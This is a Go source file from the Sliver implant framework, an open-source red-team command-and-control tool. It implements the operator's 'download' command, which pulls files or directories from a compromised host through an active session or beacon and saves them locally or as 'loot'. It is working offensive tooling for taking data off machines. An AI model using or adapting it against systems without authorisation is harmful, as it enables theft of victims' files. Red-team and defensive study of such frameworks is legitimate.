package filesystem

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"os"
	"path"
	"path/filepath"
	"strings"

	"github.com/bishopfox/sliver/client/command/loot"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
	"google.golang.org/protobuf/proto"
	"gopkg.in/AlecAivazis/survey.v1"

	"github.com/desertbit/grumble"
)

func DownloadCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}
	remotePath := ctx.Args.String("remote-path")

	ctrl := make(chan bool)
	con.SpinUntil(fmt.Sprintf("Downloading %s ...", remotePath), ctrl)
	download, err := con.Rpc.Download(context.Background(), &sliverpb.DownloadReq{
		Request: con.ActiveTarget.Request(ctx),
		Path:    remotePath,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	if download.Response != nil && download.Response.Async {
		con.AddBeaconCallback(download.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, download)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			HandleDownloadResponse(download, ctx, con)
		})
		con.PrintAsyncResponse(download.Response)
	} else {
		HandleDownloadResponse(download, ctx, con)
	}

}

func HandleDownloadResponse(download *sliverpb.Download, ctx *grumble.Context, con *console.SliverConsoleClient) {
	var err error
	if download.Response != nil && download.Response.Err != "" {
		con.PrintErrorf("%s\n", download.Response.Err)
		return
	}

	if download.Encoder == "gzip" {
		download.Data, err = new(encoders.Gzip).Decode(download.Data)
		if err != nil {
			con.PrintErrorf("Decoding failed %s", err)
		}
	}

	remotePath := ctx.Args.String("remote-path")
	localPath := ctx.Args.String("local-path")
	saveLoot := ctx.Flags.Bool("loot")

	if saveLoot {
		lootName := ctx.Flags.String("name")
		lootType, err := loot.ValidateLootType(ctx.Flags.String("type"))
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
		// Hand off to the loot package to take care of looting
		fileType := loot.ValidateLootFileType(ctx.Flags.String("file-type"), download.Data)
		loot.LootDownload(download, lootName, lootType, fileType, ctx, con)
	} else {
		fileName := filepath.Base(remotePath)
		dst, err := filepath.Abs(localPath)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}

		fi, err := os.Stat(dst)
		if err != nil && !os.IsNotExist(err) {
			con.PrintErrorf("%s\n", err)
			return
		}
		if err == nil && fi.IsDir() {
			dst = path.Join(dst, fileName)
		}

		// Add an extension to a directory download if one is not provided.
		if download.IsDir && (!strings.HasSuffix(dst, ".tgz") || !strings.HasSuffix(dst, ".tar.gz")) {
			dst += ".tar.gz"
		}

		if _, err := os.Stat(dst); err == nil {
			overwrite := false
			prompt := &survey.Confirm{Message: "Overwrite local file?"}
			survey.AskOne(prompt, &overwrite, nil)
			if !overwrite {
				return
			}
		}

		dstFile, err := os.Create(dst)
		if err != nil {
			con.PrintErrorf("Failed to open local file %s: %s\n", dst, err)
			return
		}
		defer dstFile.Close()
		n, err := dstFile.Write(download.Data)
		if err != nil {
			con.PrintErrorf("Failed to write data %v\n", err)
		} else {
			con.PrintInfof("Wrote %d bytes to %s\n", n, dstFile.Name())
		}
	}
}
